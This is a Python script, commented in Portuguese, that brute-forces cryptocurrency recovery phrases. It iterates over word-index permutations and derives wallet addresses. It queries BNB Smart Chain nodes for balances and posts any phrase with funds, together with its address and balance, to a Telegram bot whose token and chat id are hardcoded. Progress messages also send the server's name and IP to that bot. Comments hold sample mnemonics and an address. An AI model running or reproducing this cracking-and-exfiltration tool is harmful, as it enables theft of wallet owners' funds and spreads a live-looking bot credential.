#from threading import Thread
from web3 import Web3
import time
import requests
import config
import sys, json, random
import array_palavras, validadores
import itertools
import f_mnemonic_v2



var1=int(sys.argv[1])
var12=int(sys.argv[2])
server=str(sys.argv[3])
server_ip=str(sys.argv[4])
id = config.id
serv_name = config.serv_name
global x, y, z
x = config.x
y = config.y
val = config.val
inclusao = []
total_palavras=15
global total_task
total_task = 1

pos01=var1;pos02=config.pos02;pos03=config.pos03;pos04=config.pos04;pos05=config.pos05;pos06=config.pos06;pos07=config.pos07;pos08=config.pos08;pos09=config.pos09;pos10=config.pos10;pos11=config.pos11;pos12=var12;
w3 = Web3()
w3.eth.account.enable_unaudited_hdwallet_features()

wallet=""

# ENVIA QUANDO ATINGE 10M
def send_telegram2(mnemonic,balance,wallet):
    # print(f"count: "+str(count)+" - "+str(mnemonic))
    payload = {'chat_id': '139945866', 'text': '🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n\n\n\n\n\n\n\n\n\n\n\n\n\nPhrase:'+str(mnemonic)+' \nBalance: '+str(balance)+' \nWallet: '+str(wallet)+'\n\n\n\n\n\n\n\n\n\n\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢'}
    r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)  
    if r.ok:
        sys.exit()
    else:
        send_telegram2(mnemonic,balance,wallet)
        sys.exit()
    sys.exit()

def chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic):
    #mnemonic = "luxury rebel tenant boat match antique drop album dress scissors pizza crop"
    #wallet = "0xd437319A06384c55D8A0D979d12a59e8DeA9D2A3"
    #print(str(wallet))
    #print(str(mnemonic))

    rand = random.randint(0,32)
    web3 = Web3(Web3.HTTPProvider(validadores.bsc[int(rand)]))
    
    #print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
    #balance = web3.eth.get_balance(wallet)
    #print(balance)
    #balance = web3.from_wei(balance,'ether')
    #print(balance)
    #print("wwwwwwwwwwwwwwwwwwwwwwwwwwwwwww")
    wallet = str(wallet)
    balance = str(0)
    mnemonic = str(mnemonic)
    #print(wallet)
    #print(mnemonic)
    #mnemonic = "duty cycle clump adult gorilla paper saddle stand reflect agree train oven"
    try:
        balance = web3.eth.get_balance(wallet)
    except:
        chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic)
    else:
        #print("wallet "+str(wallet)+" balance "+str(web3.from_wei(balance,'ether'))+" mnemonic "+str(mnemonic))
        #echo "is running"; else echo "$(date) - Servico esta parado, estamos iniciando" >> $HOME/monit.txt;
        if balance != 0:
            #print(f"count: "+str('%018.0f' % total_wallet)+"/"+str('%018.0f' % count)+" - time: "+str("{:6.4f}".format(total))+" - "+str(w)+" | "+str(balance)+" | "+str(mnemonic)+" - "+str(valida_palavras_validadores.bsc[int(rand)]))     
            payload = {'chat_id': '139945866', 'text': '🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n\n\n\n\n\n\n\n\n\n\n\n\n\nPhrase:'+str(mnemonic)+' \nBalance: '+str(web3.from_wei(balance,'ether'))+' \nWallet: '+str(wallet)+'\n\n\n\n\n\n\n\n\n\n\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢'}
            r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)    
            if r.ok:
                pass
            else:
                chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic)            
            #arquivo = open("wallet_"+str(id)+".txt", "a")
            #arquivo.write(str(p1)+" "+str(p2)+" "+str(p3)+" "+str(p4)+" "+str(p5)+" "+str(p6)+" "+str(p7)+" "+str(p8)+" "+str(p9)+" "+str(p10)+" "+str(p11)+" "+str(p12)+"\n")    
    #print(f"WALLET: "+str(wallet)+" | "+str(balance)+" | "+str(mnemonic)+" - "+str(web3))            
    #print(balance)


payload = {'chat_id': '139945866', 'text': '🟢 LOOP ROBO:\n'+str(serv_name)+': '+str(id)+'\nSERVER: '+str(server)+'\nSERVER IP: '+str(server_ip)+'\nPhrase:'+str(pos01)+'.'+str(pos02)+'.'+str(pos03)+'.'+str(pos04)+'.'+str(pos05)+'.'+str(pos06)+'.'+str(pos07)+'.'+str(pos08)+'.'+str(pos09)+'.'+str(pos10)+'.'+str(pos11)+'.'+str(pos12)+'\nExecutado: '+str(y)+''}
r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)    



# ENVIA QUANDO ATINGE 10M
def send_telegram(serv_name,id,y,palavras):
    # print(f"count: "+str(count)+" - "+str(mnemonic))
    payload = {'chat_id': '139945866', 'text': '🟢 LOOP ROBO:\n'+str(serv_name)+': '+str(id)+'\nSERVER: '+str(server)+'\nSERVER IP: '+str(server_ip)+'\nPhrase:'+str(palavras)+'\nExecutado: '+str(y)+''}
    r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)  
    if r.ok:
        sys.exit()
    else:
        send_telegram(serv_name,id,y,palavras)
        sys.exit()
    sys.exit()

# RETORNA TRUE OR FALSE
def valida_array(palavras):
    return len(palavras) == len(set(palavras))



def validada_pos01(pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12):
    #if(pos01 > total_palavras):
    if(pos01 == pos02 or pos01 == pos03 or pos01 == pos04 or pos01 == pos05 or pos01 == pos06 or pos01 == pos07 or pos01 == pos08 or pos01 == pos09 or pos01 == pos10 or pos01 == pos11 or pos01 == pos12):
        pos01=pos01+1
    return (pos01)

def validada_pos02(pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12):
    #if(pos01 > total_palavras):
    if(pos01 == pos02 or pos02 == pos03 or pos02 == pos04 or pos02 == pos05 or pos02 == pos06 or pos02 == pos07 or pos02 == pos08 or pos02 == pos09 or pos02 == pos10 or pos02 == pos11 or pos02 == pos12):
        pos02=pos02+1
    return (pos02)

def validada_pos03(pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12):
    #if(pos01 > total_palavras):
    if(pos03 == pos01 or pos03 == pos02 or pos03 == pos04 or pos03 == pos05 or pos03 == pos06 or pos03 == pos07 or pos03 == pos08 or pos03 == pos09 or pos03 == pos10 or pos03 == pos11 or pos03 == pos12):
        pos03=pos03+1
    return (pos03)

def validada_limite_dos_valores(var1,pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12):
    if (pos01 >= total_palavras): pos01=var1;pos02=pos02+1   
    if (pos02 >= total_palavras): pos02=0;   pos03=pos03+1   
    if (pos03 >= total_palavras): pos03=0;   pos04=pos04+1   
    if (pos04 >= total_palavras): pos04=0;   pos05=pos05+1   
    if (pos05 >= total_palavras): pos05=0;   pos06=pos06+1   
    if (pos06 >= total_palavras): pos06=0;   pos07=pos07+1   
    if (pos07 >= total_palavras): pos07=0;   pos08=pos08+1   
    if (pos08 >= total_palavras): pos08=0;   pos09=pos09+1   
    if (pos09 >= total_palavras): pos09=0;   pos10=pos10+1   
    if (pos10 >= total_palavras): pos10=0;   pos11=pos11+1   
    if (pos11 >= total_palavras): pos11=0;   pos12=pos12+1 
    return(pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12)


while(pos12<=total_palavras):
    pos01=pos01+1
    x=x+1
    pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12 = validada_limite_dos_valores(var1,pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12)       
    #time.sleep(0.01)
    #print(y)
    palavras = [pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12]
    if (x % 1000000) == 0:
        time.sleep(1)
        payload = {'chat_id': '139945866', 'text': '🟢 LOOP ROBO:\n'+str(serv_name)+': '+str(id)+'\nSERVER: '+str(server)+'\nSERVER IP: '+str(server_ip)+'\nPhrase:'+str(palavras)+'\nExecutado: '+str(y)+'\nTotal_Checagem: '+str(x)+''}
        r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)  
        if r.ok:
            pass
        else:
            send_telegram(serv_name,id,y,palavras)
        print("Count: "+str('%012.0f' % int(y))+" | Count_exec: "+str('%012.0f' % int(x))+" | "+str(pos01),str(pos02),str(pos03),str(pos04),str(pos05),str(pos06),str(pos07),str(pos08),str(pos09),str(pos10),str(pos11),str(pos12))

    if(valida_array(palavras) is True):
        #print("True: ", str(palavras))
        #print(y,x,pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12,var1)
        #executa_processo(y,x,pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12,var1)
        #print(y,x,pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12,var1)
        retorno = f_mnemonic_v2.inicio(str(y),str(x),str(pos01),str(pos02),str(pos03),str(pos04),str(pos05),str(pos06),str(pos07),str(pos08),str(pos09),str(pos10),str(pos11),str(pos12),str(var1))
        if not retorno:
            pass
            #print("False: ", str(palavras))
        else:      
            #print("True: ", str(palavras))
            r = json.loads(retorno)      
            print("Count: "+str('%012.0f' % int(y))+" | Count_exec: "+str('%012.0f' % int(x))+" | "+str(r['wallet'])+" | "+str(r['seq'])+" | "+str(r['mnemonic']))                                    
            #print(r)
            #print(str(r['wallet']))
            #print(str(r['seq']))
            #print(str(r['mnemonic']))
            #Thread(target = chama_api_dos_nodes_para_validar_o_balance, args=(str(y),str(x),str(pos01),str(pos02),str(pos03),str(pos04),str(pos05),str(pos06),str(pos07),str(pos08),str(pos09),str(pos10),str(pos11),str(pos12),str(var1)), daemon=True).start()
            #Thread(target = chama_api_dos_nodes_para_validar_o_balance, args=(str(r['wallet']),str(r['mnemonic'])), daemon=True).start()        
            chama_api_dos_nodes_para_validar_o_balance(str(r['wallet']),str(r['mnemonic']))
    else:
        #print("False: ", str(palavras))
        while(valida_array(palavras) is False):
            #pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12 = validada_limite_dos_valores(var1,pos01,pos02,pos03,pos04,pos05,pos06,pos07,pos08,pos09,pos10,pos11,pos12)   
            
            while True:
                #time.sleep(0.5)
                if(pos01 < total_palavras and (pos01 == pos02 or pos01 == pos03 or pos01 == pos04 or pos01 == pos05 or pos01 == pos06 or pos01 == pos07 or pos01 == pos08 or pos01 == pos09 or pos01 == pos10 or pos01 == pos11 or pos01 == pos12)):
                    pos01=pos01+1;y=y+1
                    #print(pos01,valida_array(palavras))
                else:
                    break

            while True:
                #time.sleep(0.5)
                if(pos02 < total_palavras and (pos02 == pos03 or pos02 == pos04 or pos02 == pos05 or pos02 == pos06 or pos02 == pos07 or pos02 == pos08 or pos02 == pos09 or pos02 == pos10 or pos02 == pos11 or pos02 == pos12)):
                    pos02=pos02+1;y=y+1
                    #print(pos02,valida_array(palavras))
                else:
                    break 

            while True:
                #time.sleep(0.5)
                if(pos03 < total_palavras and (pos03 == pos04 or pos03 == pos05 or pos03 == pos06 or pos03 == pos07 or pos03 == pos08 or pos03 == pos09 or pos03 == pos10 or pos03 == pos11 or pos03 == pos12)):
                    pos03=pos03+1;y=y+1
                    #print(pos03,valida_array(palavras))
                else:
                    break 

            while True:
                #time.sleep(0.5)
                if(pos04 < total_palavras and (pos04 == pos05 or pos04 == pos06 or pos04 == pos07 or pos04 == pos08 or pos04 == pos09 or pos04 == pos10 or pos04 == pos11 or pos04 == pos12)):
                    pos04=pos04+1;y=y+1
                    #print(pos04,valida_array(palavras))
                else:
                    break  

            while True:
                #time.sleep(0.5)
                if(pos05 < total_palavras and (pos05 == pos06 or pos05 == pos07 or pos05 == pos08 or pos05 == pos09 or pos05 == pos10 or pos05 == pos11 or pos05 == pos12)):
                    pos05=pos05+1;y=y+1
                    #print(pos04,valida_array(palavras))
                else:
                    break

            while True:
                #time.sleep(0.5)
                if(pos06 < total_palavras and (pos06 == pos07 or pos06 == pos08 or pos06 == pos09 or pos06 == pos10 or pos06 == pos11 or pos06 == pos12)):
                    pos06=pos06+1;y=y+1
                    #print(pos04,valida_array(palavras))
                else:
                    break   

            while True:
                #time.sleep(0.5)
                if(pos07 < total_palavras and (pos07 == pos08 or pos07 == pos09 or pos07 == pos10 or pos07 == pos11 or pos07 == pos12)):
                    pos07=pos07+1;y=y+1
                    #print(pos04,valida_array(palavras))
                else:
                    break   

            while True:
                #time.sleep(0.5)
                if(pos08 < total_palavras and (pos08 == pos09 or pos08 == pos10 or pos08 == pos11 or pos08 == pos12)):
                    pos08=pos08+1;y=y+1
                    #print(pos04,valida_array(palavras))
                else:
                    break  

            while True:
                #time.sleep(0.5)
                if(pos09 < total_palavras and (pos09 == pos10 or pos09 == pos11 or pos09 == pos12)):
                    pos09=pos09+1;y=y+1
                    #print(pos04,valida_array(palavras))
                else:
                    break

            while True:
                #time.sleep(0.5)
                if(pos10 < total_palavras and (pos10 == pos11 or pos10 == pos12)):
                    pos10=pos10+1;y=y+1
                    #print(pos04,valida_array(palavras))
                else:
                    break

            while True:
                #time.sleep(0.5)
                if(pos11 < total_palavras and (pos11 == pos12)):
                    pos11=pos11+1;y=y+1
                    #print(pos04,valida_array(palavras))
                else:
                    break                

            break
                #while(pos01 <= total_palavras or valida_array(palavras) is True):
                #    print(pos01,valida_array(palavras))
                #    if (pos01 == pos02 or pos01 == pos03 or pos01 == pos04 or pos01 == pos05 or pos01 == pos06 or pos01 == pos07 or pos01 == pos08 or pos01 == pos09 or pos01 == pos10 or pos01 == pos11 or pos01 == pos12):
                #        pos01=pos01+1
            if (pos01 == pos02 or pos01 == pos03 or pos01 == pos04 or pos01 == pos05 or pos01 == pos06 or pos01 == pos07 or pos01 == pos08 or pos01 == pos09 or pos01 == pos10 or pos01 == pos11 or pos01 == pos12):
                pos01=pos01+1                    
            elif (pos02 == pos03 or pos02 == pos04 or pos02 == pos05 or pos02 == pos06 or pos02 == pos07 or pos02 == pos08 or pos02 == pos09 or pos02 == pos10 or pos02 == pos11 or pos02 == pos12):
                pos02=pos02+1
            elif (pos03 == pos04 or pos03 == pos05 or pos03 == pos06 or pos03 == pos07 or pos03 == pos08 or pos03 == pos09 or pos03 == pos10 or pos03 == pos11 or pos03 == pos12):
                pos03=pos03+1
            elif (pos04 == pos05 or pos04 == pos06 or pos04 == pos07 or pos04 == pos08 or pos04 == pos09 or pos04 == pos10 or pos04 == pos11 or pos04 == pos12):
                pos04=pos04+1
            elif (pos05 == pos06 or pos05 == pos07 or pos05 == pos08 or pos05 == pos09 or pos05 == pos10 or pos05 == pos11 or pos05 == pos12):
                pos05=pos05+1
            elif (pos06 == pos07 or pos06 == pos08 or pos06 == pos09 or pos06 == pos10 or pos06 == pos11 or pos06 == pos12):
                pos06=pos06+1
            elif (pos07 == pos08 or pos07 == pos09 or pos07 == pos10 or pos07 == pos11 or pos07 == pos12):
                pos07=pos07+1
            elif (pos08 == pos09 or pos08 == pos10 or pos08 == pos11 or pos08 == pos12):
                pos08=pos08+1
            elif (pos09 == pos10 or pos09 == pos11 or pos09 == pos12):
                pos09=pos09+1
            elif (pos10 == pos11 or pos10 == pos12):
                pos10=pos10+1
            elif (pos11 == pos12):
                pos11=pos11+1
            else:
                print("xxxxxxxxxxxxxxxxxxxxxx")
    
    time.sleep(0.00000005)